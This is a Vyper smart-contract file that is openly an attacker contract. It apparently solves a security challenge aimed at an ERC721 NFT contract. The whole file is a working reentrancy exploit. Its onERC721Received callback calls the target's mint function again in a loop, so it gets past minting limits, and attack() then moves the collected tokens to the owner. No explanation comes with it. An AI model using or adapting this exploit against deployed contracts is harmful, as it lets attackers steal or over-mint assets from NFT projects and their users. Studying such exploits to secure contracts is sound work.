# @version ^0.3.7

from vyper.interfaces import ERC721 as IERC721

interface INFT:
    def getNFTPrice() -> uint256: view

owner: immutable(address)

NFT_PER_MINT: constant(uint256) = 30
LOOP: constant(uint256) = 13

nft: address
token_ids: DynArray[uint256, max_value(uint16)]

@external
@payable
def __init__(_nft: address):
    owner = msg.sender
    self.nft = _nft

@external
def attack():
    assert msg.sender == owner, "!owner"
    self._mint_nft()
    for token_id in self.token_ids:
        IERC721(self.nft).transferFrom(self, owner, token_id)

@external
def onERC721Received(
    operator: address,
    sender: address,
    tokenId: uint256,
    data: Bytes[32]
) -> bytes4:
    assert msg.sender == self.nft, "!nft"
    self.token_ids.append(tokenId)
    
    if IERC721(self.nft).balanceOf(self) <= LOOP:
        self._mint_nft()

    return convert(
        method_id("onERC721Received(address,address,uint256,bytes)"),
        bytes4,
    )

@internal
def _mint_nft():
    raw_call(
        self.nft,
        _abi_encode(
            NFT_PER_MINT,
            method_id=method_id("mint(uint256)")
        ),
        value= INFT(self.nft).getNFTPrice() * NFT_PER_MINT,
    )
